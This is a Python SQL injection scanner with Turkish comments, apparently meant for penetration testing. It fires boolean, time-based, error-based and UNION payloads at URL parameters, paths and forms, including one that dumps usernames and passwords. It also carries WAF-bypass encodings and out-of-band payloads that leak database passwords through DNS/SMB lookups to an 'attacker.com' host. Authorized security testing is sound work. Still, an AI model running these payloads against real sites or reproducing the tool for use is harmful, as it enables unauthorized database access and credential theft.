#   python selam.py -u "http://10.0.2.31/wordpress/?p=4" -v -o sonuclar.json


#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gelişmiş SQL Injection Test Aracı
Author: [Your Name]
Date: [Current Date]
Version: 2.1
"""

import requests
import argparse
import re
import time
from urllib.parse import urlparse, urljoin, quote
from bs4 import BeautifulSoup
import random
import string
import json
import sys

# User Agent listesi
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
]

# SQL Injection payloadları
PAYLOADS = {
    # Boolean-based Blind
    "boolean": [
        "' OR 1=1 --",
        "' OR 'a'='a",
        "' OR 1=1#",
        "\" OR \"\"=\"",
        "' OR ''='",
        "' OR 1=1 -- ",
        "' OR 'x'='x",
        "' OR 1=1 /*",
        "\" OR 1=1 -- ",
        "' OR 1=1; --"
    ],
    
    # Time-based Blind
    "time": [
        "' OR (SELECT * FROM (SELECT(SLEEP(5)))abc) --",
        "' OR SLEEP(5) --",
        "' WAITFOR DELAY '0:0:5' --",
        "' OR BENCHMARK(10000000,MD5(1)) --",
        "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES) > 0 AND SLEEP(5) --"
    ],
    
    # Error-based
    "error": [
        "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1) --",
        "' AND EXTRACTVALUE(1,CONCAT(0x5c,0x27,(SELECT @@version),0x27)) --",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
        "' AND (SELECT 1 FROM(SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a) --",
        "' AND 1=CONVERT(int,@@version) --"
    ],
    
    # UNION-based
    "union": [
        "' UNION SELECT NULL,NULL,NULL --",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT @@version,USER(),DATABASE() --",
        "' UNION SELECT table_name,NULL FROM information_schema.tables --",
        "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --",
        "' UNION SELECT username,password FROM users --"
    ],
    
    # Out-of-band
    "oob": [
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\share\\')) --",
        "' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share\\'))) --"
    ],
    
    # Modern bypass teknikleri
    "modern": [
        "'/**/OR/**/1=1 --",
        "'/*!50000OR*/1=1 --",
        "'||1=1 --",
        "'||'a'='a",
        "' XOR 1=1 --",
        "' DIV 1=1 --",
        "' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END)) --",
        "' REGEXP (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END)) --",
        "'!1 OR 1=1 --",
        "' OR 1=1 LIMIT 1 --"
    ]
}

# WAF bypass payloadları
WAF_BYPASS_PAYLOADS = [
    # Encoding bypass
    "%27%20OR%201=1%20--",
    "%2527%2520OR%25201=1%2520--",
    "'%0AOR%0A1=1%0A--",
    "'%09OR%091=1%09--",
    
    # Comment bypass
    "'/**/OR/**/1=1/**/--",
    "'/*!50000OR*//*!500001=1*/--",
    
    # Concatenation
    "'+"+"OR+"+"1=1+"+"--",
    "'||'OR'||'1=1'||'--",
    
    # Null byte
    "'%00OR 1=1 --",
    
    # Unicode
    "'\u0020OR\u00201=1\u0020--",
    "'\u00A0OR\u00A01=1\u00A0--"
]

class SQLiTester:
    def __init__(self, target_url, verbose=False, delay=1, timeout=10, output_file=None):
        self.target_url = target_url
        self.verbose = verbose
        self.delay = delay
        self.timeout = timeout
        self.output_file = output_file
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        self.vulnerable_params = []
        self.results = []
        
    def log(self, message, level="info"):
        """Log messages with different levels"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_msg = f"[{timestamp}] [{level.upper()}] {message}"
        
        if self.verbose or level in ("warning", "error"):
            print(log_msg)
            
        if self.output_file:
            with open(self.output_file, "a") as f:
                f.write(log_msg + "\n")
                
        self.results.append(log_msg)
    
    def get_forms(self, url):
        """Extract all forms from the page"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            self.log(f"Error extracting forms: {str(e)}", "error")
            return []
    
    def get_form_details(self, form):
        """Extract form details (action, method, inputs)"""
        details = {}
        details['action'] = form.attrs.get('action', '').lower()
        details['method'] = form.attrs.get('method', 'get').lower()
        details['inputs'] = []
        
        for input_tag in form.find_all('input'):
            input_type = input_tag.attrs.get('type', 'text')
            input_name = input_tag.attrs.get('name')
            input_value = input_tag.attrs.get('value', '')
            if input_name:
                details['inputs'].append({
                    'type': input_type,
                    'name': input_name,
                    'value': input_value
                })
                
        for select_tag in form.find_all('select'):
            select_name = select_tag.attrs.get('name')
            if select_name:
                details['inputs'].append({
                    'type': 'select',
                    'name': select_name,
                    'value': ''
                })
                
        for textarea_tag in form.find_all('textarea'):
            textarea_name = textarea_tag.attrs.get('name')
            if textarea_name:
                details['inputs'].append({
                    'type': 'textarea',
                    'name': textarea_name,
                    'value': ''
                })
                
        return details
    
    def is_vulnerable(self, response):
        """Check if the response indicates SQL injection vulnerability"""
        errors = {
            # MySQL
            "SQL syntax.*MySQL",
            "Warning.*mysql_.*",
            "MySQL Query fail.*",
            "SQL syntax.*MariaDB server",
            
            # SQL Server
            "Unclosed quotation mark after the character string",
            "Microsoft SQL Native Client error.*",
            "SQL Server.*Driver.*",
            "System.Data.SqlClient.SqlException",
            
            # Oracle
            "ORA-[0-9]{4,5}",
            "Oracle error",
            "Oracle.*Driver",
            "Warning.*oci_.*",
            
            # PostgreSQL
            "PostgreSQL.*ERROR",
            "Warning.*pg_.*",
            "Npgsql\..*",
            
            # SQLite
            "SQLite/JDBCDriver",
            "SQLite.Exception",
            "System.Data.SQLite.SQLiteException",
            
            # Generic
            "Syntax error.*SQL",
            "SQL.*syntax.*error",
            "Warning.*sql_.*",
            "Unclosed.*quotation.*mark.*",
            "You have an error in your SQL syntax"
        }
        
        for error in errors:
            if re.search(error, response.text, re.IGNORECASE):
                return True
                
        return False
    
    def test_url(self, url, params=None):
        """Test a URL for SQL injection vulnerabilities"""
        self.log(f"Testing URL: {url}")
        
        # Test GET parameters
        if params:
            for param in params:
                self.log(f"Testing parameter: {param}")
                for payload_type in PAYLOADS:
                    for payload in PAYLOADS[payload_type]:
                        try:
                            test_params = params.copy()
                            test_params[param] = payload
                            
                            start_time = time.time()
                            response = self.session.get(url, params=test_params, timeout=self.timeout)
                            elapsed_time = time.time() - start_time
                            
                            if self.is_vulnerable(response):
                                self.log(f"Potential {payload_type} SQLi found in parameter {param} with payload: {payload}", "warning")
                                self.vulnerable_params.append({
                                    'url': url,
                                    'parameter': param,
                                    'type': payload_type,
                                    'payload': payload,
                                    'response_time': elapsed_time
                                })
                                return True
                            
                            # Time-based detection
                            if payload_type == "time" and elapsed_time >= 5:
                                self.log(f"Potential time-based SQLi found in parameter {param} with payload: {payload}", "warning")
                                self.vulnerable_params.append({
                                    'url': url,
                                    'parameter': param,
                                    'type': payload_type,
                                    'payload': payload,
                                    'response_time': elapsed_time
                                })
                                return True
                            
                            time.sleep(self.delay)
                            
                        except Exception as e:
                            self.log(f"Error testing parameter {param} with payload {payload}: {str(e)}", "error")
                            continue
        
        # Test URL path injection
        url_parts = urlparse(url)
        path_parts = url_parts.path.split('/')
        
        for i in range(len(path_parts)):
            test_path = path_parts.copy()
            for payload_type in ["boolean", "union"]:
                for payload in PAYLOADS[payload_type]:
                    try:
                        test_path[i] = quote(payload)
                        test_url = url_parts._replace(path='/'.join(test_path)).geturl()
                        
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=self.timeout)
                        elapsed_time = time.time() - start_time
                        
                        if self.is_vulnerable(response):
                            self.log(f"Potential {payload_type} SQLi found in URL path at position {i} with payload: {payload}", "warning")
                            self.vulnerable_params.append({
                                'url': test_url,
                                'parameter': f"path[{i}]",
                                'type': payload_type,
                                'payload': payload,
                                'response_time': elapsed_time
                            })
                            return True
                            
                        time.sleep(self.delay)
                        
                    except Exception as e:
                        self.log(f"Error testing URL path position {i} with payload {payload}: {str(e)}", "error")
                        continue
        
        return False
    
    def test_form(self, form_details, url):
        """Test a form for SQL injection vulnerabilities"""
        self.log(f"Testing form with action: {form_details['action']}")
        
        target_url = urljoin(url, form_details['action'])
        
        for input_field in form_details['inputs']:
            if input_field['type'] in ('hidden', 'submit'):
                continue
                
            self.log(f"Testing form input: {input_field['name']}")
            
            for payload_type in PAYLOADS:
                for payload in PAYLOADS[payload_type]:
                    try:
                        data = {}
                        for field in form_details['inputs']:
                            if field['name'] == input_field['name']:
                                data[field['name']] = payload
                            else:
                                data[field['name']] = field['value']
                        
                        if form_details['method'] == 'post':
                            start_time = time.time()
                            response = self.session.post(target_url, data=data, timeout=self.timeout)
                            elapsed_time = time.time() - start_time
                        else:
                            start_time = time.time()
                            response = self.session.get(target_url, params=data, timeout=self.timeout)
                            elapsed_time = time.time() - start_time
                        
                        if self.is_vulnerable(response):
                            self.log(f"Potential {payload_type} SQLi found in form input {input_field['name']} with payload: {payload}", "warning")
                            self.vulnerable_params.append({
                                'url': target_url,
                                'parameter': input_field['name'],
                                'type': payload_type,
                                'payload': payload,
                                'response_time': elapsed_time
                            })
                            return True
                        
                        # Time-based detection
                        if payload_type == "time" and elapsed_time >= 5:
                            self.log(f"Potential time-based SQLi found in form input {input_field['name']} with payload: {payload}", "warning")
                            self.vulnerable_params.append({
                                'url': target_url,
                                'parameter': input_field['name'],
                                'type': payload_type,
                                'payload': payload,
                                'response_time': elapsed_time
                            })
                            return True
                        
                        time.sleep(self.delay)
                        
                    except Exception as e:
                        self.log(f"Error testing form input {input_field['name']} with payload {payload}: {str(e)}", "error")
                        continue
        
        return False
    
    def test_waf_bypass(self, url, params=None):
        """Test WAF bypass techniques"""
        self.log("Testing WAF bypass techniques...")
        
        if params:
            for param in params:
                for payload in WAF_BYPASS_PAYLOADS:
                    try:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        response = self.session.get(url, params=test_params, timeout=self.timeout)
                        
                        if self.is_vulnerable(response):
                            self.log(f"WAF bypass successful for parameter {param} with payload: {payload}", "warning")
                            self.vulnerable_params.append({
                                'url': url,
                                'parameter': param,
                                'type': 'waf_bypass',
                                'payload': payload,
                                'response_time': 0
                            })
                            return True
                            
                        time.sleep(self.delay)
                        
                    except Exception as e:
                        self.log(f"Error testing WAF bypass for parameter {param} with payload {payload}: {str(e)}", "error")
                        continue
        
        return False
    
    def scan(self):
        """Main scanning function"""
        self.log(f"Starting SQL injection scan for: {self.target_url}")
        
        try:
            # Test the base URL first
            response = self.session.get(self.target_url, timeout=self.timeout)
            
            # Parse URL parameters
            url_parts = urlparse(self.target_url)
            params = {}
            if url_parts.query:
                params = dict(pair.split('=') for pair in url_parts.query.split('&') if '=' in pair)
            
            # Test URL parameters
            self.test_url(self.target_url, params)
            
            # Test WAF bypass if no vulnerabilities found
            if not self.vulnerable_params:
                self.test_waf_bypass(self.target_url, params)
            
            # Extract and test forms
            forms = self.get_forms(self.target_url)
            for form in forms:
                form_details = self.get_form_details(form)
                self.test_form(form_details, self.target_url)
            
            # Follow links and test other pages (limited to same domain)
            if url_parts.netloc:
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(self.target_url, href)
                    if urlparse(full_url).netloc == url_parts.netloc:
                        self.test_url(full_url)
            
            # Print summary
            if self.vulnerable_params:
                self.log("\n=== SQL Injection Vulnerabilities Found ===", "warning")
                for vuln in self.vulnerable_params:
                    self.log(f"URL: {vuln['url']}", "warning")
                    self.log(f"Parameter: {vuln['parameter']}", "warning")
                    self.log(f"Type: {vuln['type']}", "warning")
                    self.log(f"Payload: {vuln['payload']}", "warning")
                    self.log(f"Response Time: {vuln['response_time']:.2f}s\n", "warning")
            else:
                self.log("No SQL injection vulnerabilities found", "info")
                
        except Exception as e:
            self.log(f"Error during scanning: {str(e)}", "error")
        
        return self.vulnerable_params

def main():
    parser = argparse.ArgumentParser(description='Advanced SQL Injection Tester')
    parser.add_argument('-u', '--url', required=True, help='Target URL to test')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-d', '--delay', type=float, default=1, help='Delay between requests (seconds)')
    parser.add_argument('-t', '--timeout', type=float, default=10, help='Request timeout (seconds)')
    parser.add_argument('-o', '--output', help='Output file to save results')
    
    args = parser.parse_args()
    
    tester = SQLiTester(
        target_url=args.url,
        verbose=args.verbose,
        delay=args.delay,
        timeout=args.timeout,
        output_file=args.output
    )
    
    vulnerabilities = tester.scan()
    
    if args.output:
        with open(args.output, 'w') as f:
            json.dump({
                'target_url': args.url,
                'vulnerabilities': vulnerabilities,
                'scan_date': time.strftime("%Y-%m-%d %H:%M:%S")
            }, f, indent=2)
    
    sys.exit(0 if not vulnerabilities else 1)

if __name__ == '__main__':
    main()
